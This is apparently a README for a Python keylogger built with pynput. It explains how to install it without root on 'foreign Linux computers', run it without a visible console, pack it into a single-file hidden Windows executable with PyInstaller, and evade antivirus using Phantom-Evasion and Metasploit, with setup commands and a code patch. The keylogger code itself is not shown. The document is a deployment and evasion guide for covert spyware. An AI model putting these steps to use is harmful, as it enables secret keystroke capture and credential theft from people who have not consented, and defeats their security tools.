# Python 3
## Requirements
Needs to be run in /home/user
pip3 pynput

## Run on Linux
To make sure the console does not appear when running the script save it as a *.pyw file

### Install pynput without root rights for deployment on foreign Linux computers
wget https://bootstrap.pypa.io/get-pip.py && python3 get-pip.py --user
cd .local/bin
./pip install pynput --user

## Pack for Windows on Windows
How to pack it with pyinstaller. This has to be done in windows environment.
- Install python3 (not from App Store but from www.python.org) for compatibility use 32bit Version
- Add python to Path in System Variables in Windows (e.g. %APPDATA%\Local\Programs\Python\Python39-32\)


Then go into CMD into this folder:
<code>
python -m pip install virtualenv
python -m pip install pyinstaller 
python -m venv env
env\\Scripts\\activate
python -m pip install -r requirements.txt
python -m pip install pyinstaller
python -m PyInstaller --onefile -w -F keylogger-usage.pyw
</code>

After running this you find the error log in 
<code>build/keylogger-usage/warn-keylogger-usage.txt</code>
which have to be inspected and the *.exe file in 
<code>dist/keylogger-usage</code>

### Antivirus evasion

This is recommended see file Antivirus-Evasion\instructions.md

### Phantom Evasion
https://github.com/oddcod3/Phantom-Evasion
https://kalilinuxtutorials.com/phantom-evasion/   => Section "Wine-Pyinstaller modules:"

If on KaliLinux manual install is not necessary.

##### Manual Install
Metasploit: https://github.com/rapid7/metasploit-framework run the nightly script from github for installation

For setup of Phantom-Evasion:
Clone from git and change the line 
<code>
def OtherLinuxSetup(rel):
</code>
in the file Setup/Setup_lib.py to
<code>
def OtherLinuxSetup(rel = ["ubuntu"]):
</code>
or similar depending on the current OS.

<code>
python3 phantom-evasion.py
</code>

## Source
https://nitratine.net/blog/post/python-keylogger/
https://nitratine.net/blog/post/convert-py-to-exe/#pyinstaller